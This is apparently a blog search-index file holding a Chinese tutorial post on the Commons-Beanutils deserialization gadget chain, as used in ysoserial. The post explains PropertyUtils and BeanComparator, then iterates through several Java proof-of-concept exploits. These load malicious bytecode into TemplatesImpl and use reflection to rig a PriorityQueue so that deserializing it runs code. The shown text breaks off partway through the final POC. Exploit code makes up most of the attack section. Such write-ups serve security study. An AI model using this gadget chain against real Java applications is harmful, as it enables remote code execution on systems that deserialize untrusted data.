<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CB链</title>
    <url>/2024/08/13/CB%E9%93%BE/</url>
    <content><![CDATA[<p>CB链学习</p>
<span id="more"></span>

<h1 id="CB链"><a href="#CB链" class="headerlink" title="CB链"></a>CB链</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h5 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h5><p>pom.xml添加：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">1.8</span><span class="number">.3</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;commons-logging&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h5 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h5><ul>
<li>commons-beanutils 1.8.3</li>
<li>commons-logging:commons-logging:1.2</li>
<li>JDK 8u411</li>
<li>commons-collections3.2.1</li>
</ul>
<p>这里需要3.2.1的原因是后面要利用的BeanComparator要用：<br><img src="/2024/08/13/CB%E9%93%BE/image-20240809203554712.png" alt="image-20240809203554712"></p>
<p>踩了一下坑，这里4是用不了的</p>
<h2 id="正式学习"><a href="#正式学习" class="headerlink" title="正式学习"></a>正式学习</h2><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通java类对象（也称为JavaBean）的一些操作方法。</p>
<p>而JavaBean是一个遵循特定写法的Java类，它通常具有如下特点：</p>
<p>- </p>
<ul>
<li>这个类必须具有一个无参的构造函数（一般我们没自定义构造函数的话默认的就是无参的构造函数）</li>
<li>属性必须私有化</li>
<li>私有化的属性必须通过public类型的方法暴露给其他程序，并且方法的命名也必须遵守一定的命名规范。</li>
</ul>
<p>比如如下的Cat类就是一个最简单的JavaBean类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> &#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;catalina&quot;</span>;</span><br><span class="line">		</span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.name = name;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它包含一个私有属性name，和读取和设置这个属性的两个方法，又称为getter和setter。</p>
<h3 id="需要了解的类"><a href="#需要了解的类" class="headerlink" title="需要了解的类"></a>需要了解的类</h3><h4 id="PropertyUtils"><a href="#PropertyUtils" class="headerlink" title="PropertyUtils"></a>PropertyUtils</h4><p>它是对JavaBean进行操作的工具类，可单独为某个属性进行值的操作的工具类。它利用反射操作Bean的属性。<strong>这个类位于</strong><code>org.apache.commons.beanutils.PropertyUtils</code>。</p>
<p>&#96;&#96;PropertyUtils&#96;类中提供了一些public的静态方法，以便直接调用一些getter和setter方法：</p>
<p>- </p>
<ul>
<li>getProperty：返回指定Bean的指定属性的值</li>
<li>getSimpleProperty：返回执行Bean的指定属性的值</li>
<li>setProperty：设置指定Bean的指定属性的值</li>
<li>setSimpleProperty：设置指定Bean的指定属性的值</li>
</ul>
<p>看一个实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        PropertyUtils.setProperty(x,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        System.out.println(x.getName());</span><br><span class="line"></span><br><span class="line">        x.setName(<span class="string">&quot;haha&quot;</span>);</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(x,<span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fupanc</span><br><span class="line">haha</span><br></pre></td></tr></table></figure>

<p>看这个结果已经很容易知道前面的方法是干嘛的了。注意一下在调用方法时对于参数设置的问题。</p>
<p>所以这里其实很容易看出，<strong>PropertyUtils.getProperty&#x2F;setProperty方法，参数一定要注意，其实就可以理解为调用对应类变量的getter和setter方法。</strong></p>
<h4 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h4><p>前面也说过，其实CB链就是cc2的基础上新找了一个调用compare进行利用。在ysoserial中利用到的是<code>BeanComparator</code>类，这个类位于<code>org.apache.commons.beanutils.BeanComparator</code>，我们来看一下他的compare方法：<br><img src="/2024/08/13/CB%E9%93%BE/image-20240809162246985.png" alt="image-20240809162246985"></p>
<p>重点关注：</p>
<p><img src="/2024/08/13/CB%E9%93%BE/image-20240809163359248.png" alt="image-20240809163359248"></p>
<p>前面说过<code>getProperty()</code>方法，在这里那么就会调用o1、o2对象的<code>property</code>变量的getter方法。</p>
<p>在ysoserial中，CB链利用到了TemplatesImpl类，是通过<code>PropertyUtils.getProperty</code>来调用<code>_outputProperties</code>变量的getter方法，也就是TemplatesImpl的getOutputProperties方法来动态加载字节码，那么现在来看一下<code>getOutputProperties()</code>方法的源码：<br><img src="/2024/08/13/CB%E9%93%BE/image-20240809164259097.png" alt="image-20240809164259097"></p>
<p><strong>这里调用了newTransformer()方法，在这里就可以进行一次恶意动态加载字节码的过程。</strong></p>
<p>那么在BeanComparator的compare()方法中，我们需要控制o1&#x2F;o2为TemplatesImpl对象，<code>this.Properties</code>为<code>outputProperties</code>字符串。</p>
<p>看一下BeanComparator类的构造方法，按照前面的描述，我们这里不需要自定义<code>this.comparator</code>变量，这里我们要利用到的是构造方法是：</p>
<p><img src="/2024/08/13/CB%E9%93%BE/image-20240809170449454.png" alt="image-20240809170449454"></p>
<p>其实也就是下面那个，但是直接使用“默认”的comparator了。</p>
<h3 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h3><p>前面把基本的链给了出来，在这里还是利用的PriorityQueue作为序列化和反序列化的类，反序列化的时候是差不多的，最终到调用compare()方法的地方是：</p>
<p><img src="/2024/08/13/CB%E9%93%BE/image-20240809170903843.png" alt="image-20240809170903843"></p>
<p>现在其实感觉和CC2差不多了。</p>
<p>构造基本的字节码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\maven_text\\maven1_text\\target\\test-classes\\org\\example\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tem,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(tem,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(tem, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(tem, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后其他流程直接当做cc2那里看，现在简单分别分析一下过程。</p>
<h5 id="反序列化部分"><a href="#反序列化部分" class="headerlink" title="反序列化部分"></a>反序列化部分</h5><ul>
<li>和CC2差不多，PriorityQueue的readObject() &#x3D;》heapify() &#x3D;》siftDown() &#x3D;》siftDownUsingComparator，最终也就是如下：</li>
</ul>
<p><img src="/2024/08/13/CB%E9%93%BE/image-20240809195718569.png" alt="image-20240809195718569"></p>
<p>按照CC2过程来，假如我们add进两个值，那么这里的k为0，x为queue[0]的值，也就是我们第一个add进的值，同时看这个方法的内部，那么在分别说一下值问题：</p>
<ul>
<li>half：1</li>
<li>child：1</li>
<li>right：2</li>
</ul>
<p>所以上面的c对应我们前面add进的第二个值，看大小情况可以知道是<strong>会进入第二个if条件</strong>语句，对应参数分别为（x：queue[0]，c：queue[1]）。</p>
<p>结合前面对BeanComparator类的compare()方法的描述，<strong>可以知道我们这里至少需要一个为设计好了的TemplatesImpl类对象。</strong></p>
<h5 id="序列化部分"><a href="#序列化部分" class="headerlink" title="序列化部分"></a>序列化部分</h5><p>add()有个部分，在第二次add进值的时候：<br><img src="/2024/08/13/CB%E9%93%BE/image-20240809173717617.png" alt="image-20240809173717617"></p>
<p>按照前面的说法，这里会进入BeanComparator的compare()方法，这里的k即是1，x即是我第二次要放入的值，e就是queue[0]，也就是我放入的第一个值。看这里的compare()的值，看参数（x：add2，e：queue[0]），在前面序列化的时候说了，我们需要至少add进一个TemplatesImpl类实例，那么其实在这里同样可以尝试一下构造在序列化时弹出计算机：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\maven_text\\maven1_text\\target\\test-classes\\org\\example\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tem,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(tem,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(tem, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(tem, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,bean);</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line">        priority.add(tem);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功按照预期弹出一个计算机。<strong>还有就是存在一个和之前一样的问题</strong>，当我<strong>利用TemplatesImpl来动态加载恶意字节码</strong>的时候，如果我add进两个tem，只会弹出一个计算机，在第一个结束后会直接报错结束，并不会进入第二个利用点：<br><img src="/2024/08/13/CB%E9%93%BE/image-20240809204312854.png" alt="image-20240809204312854"></p>
<p>比如CC4等。</p>
<p><strong>还有一个需要注意的点就是这里add进的顺序也有讲究</strong>，比如我像上面代码那样只add进一个，那么我必须<strong>保证tem在o1，因为o1&#x2F;o2必须为一个类实例</strong>，按照前面将的参数问题，o1对应add2，也就是我要在第二个地方add进tem，否则会直接报错退出。</p>
<p><u>那么我们现在继续关注第二次add后会发生什么：</u><br>在前面抛出异常后，不知道调用compare()方法后到底会返回什么，那么我们直接打断点来看会到哪里，发现确实会在抛出异常后直接退出，那么这样<strong>我们并不能成功在queue[1]成功设置为tem，从而导致后续都失败。</strong></p>
<p>在ysoserial中给出了解决方法，我们可以先往里面随便add进值，然后再反射更改为我想利用的，那么测试代码可以改为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\maven_text\\maven1_text\\target\\test-classes\\org\\example\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tem,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(tem,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(tem, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(tem, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,bean);</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Object[] x = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="number">1</span>,tem&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(priority,x);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(priority);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后这里报错了我们上面说的问题，PropertyUtils的getProperty的方法第一个参数需要为类实例，但是我们这里传入的都是整数，所以在第二次add后会报错。</p>
<p><img src="/2024/08/13/CB%E9%93%BE/image-20240809210407199.png" alt="image-20240809210407199"></p>
<p>解决方法，在BeanComparator的compare()方法中：<br><img src="/2024/08/13/CB%E9%93%BE/image-20240809210510663.png" alt="image-20240809210510663"></p>
<p>这里只要满足property为null，就不会再调用getProperty()方法，而是正常的compare方法来比较。</p>
<p>所以我们这里可以使得property先为null，而后再反射修改这个值为outputProperties。</p>
<p>那么POC为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\maven_text\\maven1_text\\target\\test-classes\\org\\example\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tem,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(tem,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(tem, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(tem, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,bean);</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//错误点</span></span><br><span class="line">        Object[] x = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="number">1</span>,tem&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(priority,x);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;outputProperties&quot;</span>;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> BeanComparator.class.getDeclaredField(<span class="string">&quot;property&quot;</span>);</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field2.set(bean,name);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(priority);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续报错</p>
<p><img src="/2024/08/13/CB%E9%93%BE/image-20240809211752282.png" alt="image-20240809211752282"></p>
<p>然后思考，这里逻辑明明没有问题，但是为啥还是弹这个问题，然后我尝试修改为<strong>传入两个tem，成功弹出计算机</strong>，然后再仔细比对一下，找出问题所在，问题处在前面的POC标出来了，感兴趣的可以先自己想想。</p>
<p>我前面的POC构造是<strong>按照序列化前的add()部分构造的</strong>，其中的顺序需要为：</p>
<p><strong>add1为其他，必须add2为tem</strong>。</p>
<p>但是在反序列化过程中</p>
<p>注意前面分析时给出的结果，在反序列时调用到BeanComparator的compare()方法时的参数分别为<strong>（x：queue[0]，c：queue[1]）</strong>。</p>
<p>所以这里是先调用的queue[0，同时结合我们前面的说法，只会调用一次，所以我们这里需要，如下设置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object[] x = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tem,<span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>那么最终的POC为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\maven_text\\maven1_text\\target\\test-classes\\org\\example\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tem,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(tem,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(tem, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(tem, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,bean);</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        